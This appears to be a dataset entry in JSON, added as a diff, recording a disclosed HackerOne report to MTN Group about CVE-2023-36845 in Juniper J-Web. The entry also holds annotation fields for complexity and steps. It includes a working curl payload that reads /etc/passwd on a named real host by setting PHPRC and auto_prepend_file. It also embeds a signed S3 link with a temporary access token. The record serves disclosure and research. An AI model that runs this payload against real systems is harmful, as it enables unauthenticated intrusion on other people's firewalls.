@@ -1,0 +1,40 @@
+{
+  "reported_to": "MTN Group",
+  "reported_by": "m4lc0lmx ",
+  "title": "Remote code execution [CVE-2023-36845]",
+  "content": "\nCVE-2023-36845\nA PHP External Variable Modification vulnerability in J-Web of Juniper Networks Junos OS on EX Series and SRX Series allows an unauthenticated, network-based attacker to control certain, important environments variables. Utilizing a crafted request an attacker is able to modify a certain PHP environment variable leading to partial loss of integrity,\nPOC :\nwith curl\n41.205.30.222 = host-41.205.30.222.mtn.cm\nCode 95 Bytes\n1curl -sk \"https://41.205.30.222/?PHPRC=/dev/fd/0\" -X POST -d 'auto_prepend_file=\"/etc/passwd\"'\n2\n<image_0>\nImpact\nCVE-2023-36845 that allows an unauthenticated and remote attacker to execute arbitrary code on Juniper firewalls without creating a file on the system.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "None"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3celjhou8z8cu9f6smqwlx0z6y7d?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-09-26_170807.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-09-26_170807.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSYNEIXS%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T204847Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID34EjFczoP1AjX9wTcrwX01Xh5LYwoYOnMQLlFVYWIdAiBbpQJSkWEQhhnP3zcCVWrbrTi80fcQqNnBE8AA5rSIESq7BQjz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMcwXVHg4YyWhz8TFvKo8FtD4c5BjMeV125K1w41MsQxaE1Z5piY%2BWYCLuJ8C9JHEMnMYc3et02nod3A%2BV%2FBSXZdbnE5ZvakUuemlcfJMPCy0qgJgN3skRaRmIN1j10kqsgeZd0Yn4nNcUA2cSIjqArKICHRDMnNN6bE5GQvWFLG3FZC%2FlFNUfhfQjqs08gAkby3R4JiEzxQqu5K%2B1vft1i8pQKsRwVopPhvRiib7qlOtVmRTavaSuxo%2Fkk1ZufJPA0TJoaUbc0GnZQKEQFeh2VovdSQ4Kam2yPUX8bZMHUWdcZiy%2BDvomf%2BnHVVkH2Lxr0y35m6siQOhGyu%2Fh%2BdOGGWcUqKa9Q%2B4NGLChKi98JfXJsEEDN7uyg%2FF1ZooLggIR3erogeGigVX2On22hhXFTBl0%2FgPm0i9WzK2NkZUOaN%2FG%2FODK1pLJrTj7lQDO0pbGEzWGtCxE0NnVUizsZ3d43936aiXwE0DBS00hgTuOs1ueqt%2FiZTip0cRns7WVtQyGRvCrldyrIubIKnRXPrMxGTYM2kezEn1UFC6Xd8YYWXzZeb%2FoodNtNHg7Ej%2BbuAhVCx7lDf8gLQiBZeriKB0ozSTuH8%2FndYVkG7YnrkDnjqmwf8lEDBHlVcZQURxTD4Ga%2BBpMZlcwjtoZmxL6tgFhRgbIqRzV42DjMCvOXRPiT9tMqR%2BYFAnJMshgnQPmPCdJxnmFaHOUEvTqJGZcta73Wu6OL3S8Bq9qmdbNTNWcVGCIuad53Hdwy70ISiTxN47Gyna1m4smeriDZN%2B%2FdqrD%2FFCfKhzWIY7XidizbSbUT%2B43QALV2taxtJOXsp1gC7oxOM%2FuxqZizYF3buHt9JgpoEsIfPsaKDzMdxUGIhJFiUICpXbmWigsg4j%2FwFoSJDCPuoa%2FBjqyAS78m2TJbVWqb8BNA%2F73N%2FLA63wIYtada0tGJZOhUibVMnsoUL1s6ymAhEPtcjyeVzTXVNSB0J3%2BiIIEahreNu5Cj8GeEwW1jfNps%2BL3Fp2E%2Bh%2FFoRQCh0J%2FjnTQ%2FpOunsHejVL1BL0uGcuniNEYPtmoBs2jlO%2FU6SplGcVe2tKr%2BVg12L5eAMdUMEkSIlphDSSfMKrC6teFB%2F1%2FzdPIgIijpFXu6ca%2F80iTNr3GVaFgiIM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=17ea4bb47f848d2effea760f18f75402998100877102a7bbf86a4945c5fb78fa"
+  },
+  "disclosed_date": 1728497940,
+  "report_url": "https://hackerone.com/reports/2182202",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Use curl to send a crafted POST request to the target host with the PHPRC parameter set to '/dev/fd/0' and include a payload that sets 'auto_prepend_file' to '/etc/passwd'."
+    ],
+    [
+      2,
+      "The server processes the request, modifying the PHP environment variable as specified, leading to arbitrary code execution."
+    ]
+  ],
+  "vuln_description": "A PHP External Variable Modification vulnerability in J-Web of Juniper Networks Junos OS allows an unauthenticated, network-based attacker to control certain PHP environment variables. By crafting a specific request, the attacker can modify a PHP environment variable to execute arbitrary code remotely without authentication.",
+  "reason": "The vulnerability involves a straightforward manipulation of a PHP environment variable through a crafted HTTP request. The attack does not require multiple components, complex state manipulation, or novel logic. The interaction is direct and the exploit is simple to execute once the vulnerable parameter is identified.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
